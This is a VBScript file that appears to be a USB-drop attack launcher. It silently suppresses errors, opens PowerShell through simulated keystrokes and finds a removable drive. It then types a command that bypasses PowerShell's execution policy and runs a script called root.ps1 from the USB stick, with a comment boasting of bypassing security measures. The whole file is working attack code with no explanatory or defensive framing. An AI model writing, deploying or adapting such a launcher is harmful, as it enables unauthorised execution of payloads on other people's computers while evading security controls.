On Error Resume Next

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objNetwork = CreateObject("WScript.Network")

strUsername = objNetwork.UserName

objShell.Run "explorer shell:::{2559a1f3-21d7-11d4-bdaf-00c04f60b9f0}"
WScript.Sleep 500

objShell.SendKeys "C:\Users\" & strUsername & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk"
objShell.SendKeys "{ENTER}"
WScript.Sleep 750

Set colDrives = objFSO.Drives
For Each objDrive in colDrives
    If objDrive.DriveType = 1 Then
        usbDriveLetter = objDrive.DriveLetter
        Exit For
    End If
Next

Sub SlowSendKeys(obj, str, delay)
    For i = 1 To Len(str)
        obj.SendKeys Mid(str, i, 1)
        WScript.Sleep delay
    Next
End Sub

If Not IsEmpty(usbDriveLetter) Then
    powershellScriptPath = usbDriveLetter & ":\root.ps1"

    SlowSendKeys objShell, "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force", 10 ' Potentially bypassing advanced security measures.
    objShell.SendKeys "{ENTER}"

    If Err.Number <> 0 Then
        ' Just continue
    End If

    SlowSendKeys objShell, "powershell.exe -ExecutionPolicy Bypass -File " & powershellScriptPath, 10
    objShell.SendKeys "{ENTER}"

    SlowSendKeys objShell, "Exit", 10
    objShell.SendKeys "{ENTER}"
End If
